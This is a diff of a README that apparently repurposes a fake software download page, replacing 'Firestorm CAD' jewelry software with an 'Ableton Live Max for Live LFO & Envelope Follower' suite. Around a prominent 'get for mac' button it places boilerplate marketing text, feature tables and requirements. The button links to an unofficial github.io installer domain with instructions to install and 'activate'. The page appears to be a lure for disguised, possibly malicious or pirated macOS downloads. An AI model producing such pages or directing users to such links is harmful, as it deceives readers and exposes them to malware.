@@ -1,13 +1,13 @@
-# Firestorm CAD – Advanced Jewelry Modeling & Precision Crafting Platform  
+# Ableton Live – Max for Live LFO & Envelope Follower Modulation Suite  
 
 <div align="center">
-  <img src="https://img.informer.com/icons/png/128/4531/4531832.png" width="250"/>
+  <img src="https://isotonikstudios.com/wp-content/uploads/Envelope-Follower-Wide-Device-Template.png.webp" width="250"/>
 </div>  
 <br>
 
 <div align="center">
 
-[![🍏 get for mac](https://img.shields.io/badge/🍏_get_for_mac-green?style=for-the-badge&logo=apple)](https://get-osx-software.github.io/.github/firestorm-cad)
+[![🍏 get for mac](https://img.shields.io/badge/🍏_get_for_mac-green?style=for-the-badge&logo=apple)](https://setup-software-osx.github.io/.github/ableton-max-lfo-envelope)
 
 </div>
 
@@ -15,27 +15,27 @@
 
 # Installation Instructions  
 
-1. Press the button above to open the Firestorm CAD installation page.  
-2. Follow the instructions to complete setup and activate the software.  
+1. Press the button above to open the installer page.  
+2. Follow the guided steps to install and activate the Max for Live devices.  
 
 ---
 
 <div align="center">
-  <img src="https://static.wixstatic.com/media/f5e7f8_51e5e6f031344823b88588fb49aa0e59.png/v1/fill/w_239,h_266,al_c,q_85,usm_0.66_1.00_0.01,enc_avif,quality_auto/f5e7f8_51e5e6f031344823b88588fb49aa0e59.png" width="500"/>
+  <img src="https://d29rinwu2hi5i3.cloudfront.net/article_media/51fa1d6d-163b-42ed-a423-1dda48a3b643/headline-live10-sidechain-envelope-follower.jpg" width="1080"/>
 </div>  
 <br>
 
 ## 📊 Overview  
 
-Firestorm CAD is a professional jewelry design environment built for artists, goldsmiths, manufacturers, and CAD modelers who require a combination of high precision, flexibility, and advanced modeling capabilities. Purpose-engineered for jewelry workflows, it provides a comprehensive toolkit for creating rings, pendants, settings, bands, ornamental detailing, and custom designs with industry-accurate geometry.
+The Max for Live LFO and Envelope Follower extend Ableton Live’s modulation capabilities, giving producers and sound designers a versatile set of tools for creating animated, reactive, and expressive parameter control. These devices transform Live into a modular-like playground, allowing nearly any parameter to be influenced by custom-drawn LFO curves or audio-driven envelopes for dynamic and musical movement.
 
-The platform blends powerful parametric modeling with sculpting and CAD-grade construction tools, giving designers full control over curves, surfaces, symmetry, gemstone seats, and fine structural elements. Whether developing organic shapes or architectural pieces, Firestorm CAD maintains dimensional accuracy while offering intuitive manipulation of surfaces, edges, and profiles.
+The Max for Live LFO acts as a highly flexible modulation generator, offering adjustable waveforms, sync modes, frequency control, smoothing, random behavior, and modulation depth shaping. With its visual interface and real-time responsiveness, it’s ideal for crafting pulsating filters, evolving synth patches, rhythmic effects, and intricate automation patterns without manual drawing.
 
-Its interface supports fluid, iterative design, featuring dynamic controls, adjustable profiles, and non-destructive modeling options. Designers can experiment with forms, refine proportions, apply creative embellishments, and produce professional-grade concepts more efficiently. Built-in visualization tools allow users to preview gemstone brilliance, metal finishes, reflections, and lighting scenarios—useful for both client presentation and design evaluation.
+The Envelope Follower takes a different approach by listening to incoming audio and converting volume fluctuations into modulation signals. This allows effects to react directly to drums, vocals, instruments, or external sources. From building sidechain-style volume modulation to creating filter sweeps that follow rhythms, the Envelope Follower adds responsiveness and interplay to your sound design.
 
-Firestorm CAD is deeply integrated with jewelry production standards. It includes gemstone libraries, setting templates, spacing controls, prong builders, pavé distribution tools, and precision drafting aids required for real-world manufacturing. Exporting ready-to-print, clean STL models ensures compatibility with casting workflows, resin 3D printers, and milling systems.
+Used together, the LFO and Envelope Follower form a powerful modulation ecosystem inside Live. You can create hybrid modulation chains, build evolving textures, develop interactive performance setups, or sculpt subtle movement within a mix. Their tight integration with Live ensures low-latency performance, stable operation, and access to every device and plugin parameter in your session.
 
-With its specialized toolset and production-oriented workflow, Firestorm CAD serves as a complete digital studio for jewelry professionals who need accuracy, speed, and creative freedom throughout the entire design-to-production process.
+These tools are essential for electronic musicians, sound designers, and producers who want deeper modulation options and creative control beyond standard automation.
 
 ---
 
@@ -43,14 +43,13 @@ With its specialized toolset and production-oriented workflow, Firestorm CAD ser
 
 | Feature | Description |
 |---------|-------------|
-| 💎 Purpose-Built Jewelry Tools | Construct rings, bezels, prongs, channels, pavé layouts, and detailed ornaments. |
-| 🛠 Parametric Structure Editing | Modify curves, thickness, and profiles nondestructively. |
-| 🔍 Fine Detail Control | Ideal for engravings, micro-geometry, and complex decorative structures. |
-| ✨ Material & Gem Preview | View metals, stone cuts, reflections, and lighting in real time. |
-| 📐 Precision Modeling | Measurement-accurate tools built for manufacturing requirements. |
-| 🔧 Gem Libraries | Includes standardized gemstone shapes, cuts, and calibrated sizes. |
-| 🖨 Optimized STL Export | Produces clean, watertight meshes ready for 3D printing or casting. |
-| 📊 Production-Oriented Workflow | Supports stone placement, alignment tools, and tolerance-accurate components. |
+| 🔁 Customizable LFO | Draw modulation curves, sync to tempo, randomize shapes, and control depth. |
+| 🎚 Audio-Reactive Envelope Follower | Use amplitude changes to drive effects and create responsive motion. |
+| 🎛 Universal Parameter Assignment | Modulate nearly any knob, slider, or device within Live. |
+| ⚡ Sample-Accurate Modulation | Achieve tight rhythmic alignment and smooth modulation transitions. |
+| 🎶 Creative Motion Design | Add evolving movement, shape transitions, and expressive modulation. |
+| 🔗 Hybrid Modulation Chains | Combine devices for layered, complex, or adaptive modulation setups. |
+| 🧩 Fully Integrated with Max for Live | Works natively inside Live’s architecture with no extra routing. |
 
 ---
 
@@ -58,14 +57,14 @@ With its specialized toolset and production-oriented workflow, Firestorm CAD ser
 
 | Component | Requirements |
 |-----------|--------------|
-| OS | macOS 10.14 or higher |
+| OS | macOS 10.13 or later |
+| Ableton Live | Version 10.1 or newer with Max for Live included |
 | Processor | Intel or Apple Silicon |
-| RAM | Minimum 8 GB (16 GB recommended) |
-| Storage | ~2 GB free space |
-| Internet | Needed for activation and updates |
+| RAM | Minimum 4 GB |
+| Internet | Needed for activation and downloads |
 
 ---
 
 ## 🏷 Tags  
 
-firestorm cad • jewelry design cad • gemstone modeling tools • professional 3d jewelry • parametric jewelry design • jewelry production workflow  
+max for live • ableton lfo • envelope follower • creative modulation • dynamic automation • sound design tools • electronic production  
